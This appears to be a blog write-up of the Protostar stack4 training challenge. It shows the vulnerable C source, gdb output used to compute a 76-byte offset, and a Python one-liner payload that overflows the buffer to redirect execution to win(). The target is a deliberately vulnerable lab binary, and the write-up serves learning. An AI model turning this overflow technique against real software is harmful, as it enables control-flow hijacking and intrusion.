---
layout: post
title: "Protostar stack04 writeup"
tags: [protostar]
comments: false
---

This challenge gives out a source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Unlike the other protostar challenges before, we're not midifying any values but just calling this function.
We need to get the offset for buffer[64] and add 4 to that offset in order to skip the saved frame pointer.

to calculate the offset, first you get the starting of the address of $esp for the get function then subtract that from the base value

```
root@protostar:/opt/protostar/bin# gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
(gdb) b *main+21
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) r
Starting program: /opt/protostar/bin/stack4 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffffd54) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) x/10x $esp
0xbffffc50:     0xbffffc60      0xb7ec6165      0xbffffc68      0xb7eada75
0xbffffc60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc70:     0x41414141      0x41414141
(gdb) p $ebp
$1 = (void *) 0xbffffca8
(gdb) 
```

Here, you can see the star is 0xbffffc60 and the base is 0xbffffca8. 0xbffffca8-0xbffffc60+4 = 76

As the same from stack03, this cahllenge also contains a win() function where the address is

```
root@protostar:/opt/protostar/bin# objdump -t stack4 | grep win
080483f4 g     F .text  00000014              win
```

so the exploit will be

```
root@protostar:/opt/protostar/bin# (python -c 'print "A"*76+"\xf4\x83\x04\x08"') | ./stack4
code flow successfully changed
Segmentation fault
```